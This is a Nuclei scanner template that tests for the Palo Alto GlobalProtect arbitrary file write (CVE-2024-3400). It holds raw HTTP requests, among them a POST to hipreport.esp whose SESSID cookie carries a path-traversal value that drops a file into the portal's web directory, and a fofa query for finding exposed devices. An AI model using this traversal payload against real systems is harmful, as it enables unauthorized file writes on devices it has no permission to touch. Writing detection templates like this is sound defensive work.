id: globalprotect-file-write

info:
  name: GlobalProtect - Arbitrary File Write
  author: salts
  severity: critical
  description: |
    Test for Palo Alto GlobalProtect Arbitrary File Write
  reference:
    - https://labs.watchtowr.com/palo-alto-putting-the-protecc-in-globalprotect-CVE-2024-3400/
  metadata:
    vendor: paloaltonetworks
    product: pan-os
    fofa-query: icon_hash="-631559155"
  tags: kev,cve,globalprotect,pan-os

http:
  - raw:
      - |
        GET /global-protect/portal/images/{{randstr}}.txt HTTP/1.1 HTTP/1.1
        Host: {{Hostname}}        
      - |
        POST /ssl-vpn/hipreport.esp HTTP/1.1
        Host: {{Hostname}}
        Cookie: SESSID=/../../../var/appweb/sslvpndocs/global-protect/portal/images/{{randstr}}.txt;
        Content-Type: application/x-www-form-urlencoded

        user=nuclei&portal=nuclei&authcookie=e51140e4-4ee3-4ced-9373-96160d68&domain=nuclei&computer=nuclei&client-ip=nuclei&client-ipv6=nuclei&md5-sum=nuclei&gwHipReportCheck=nuclei
      - |
        GET /global-protect/portal/images/{{randstr}}.txt HTTP/1.1 HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'status_code_1 == 404 && status_code_3 == 403'
      
